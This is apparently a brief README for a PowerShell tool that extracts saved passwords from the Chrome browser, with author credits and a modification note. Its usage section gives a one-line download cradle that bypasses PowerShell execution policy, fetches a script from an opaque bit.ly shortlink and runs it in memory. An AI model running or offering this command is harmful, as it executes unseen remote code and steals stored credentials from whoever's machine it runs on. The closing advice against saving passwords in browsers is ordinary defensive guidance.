# credgrap_crhome

Content:      Extract stored credentials from Chrome

Author:       Florian Hansemann | @HanseSecure | https://hansesecure.de

Source:       Chrome extraction imported from https://github.com/sekirkity/BrowserGather (project seems dead)

Modification: Chrome Credential extraction fixed and cookie extraction deleted (buggy)

Date:          04/2018

## Usage
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/2FcJJ3k’)"

## Recommendation

Don't save any passwords within your browser and use password safes ;-)
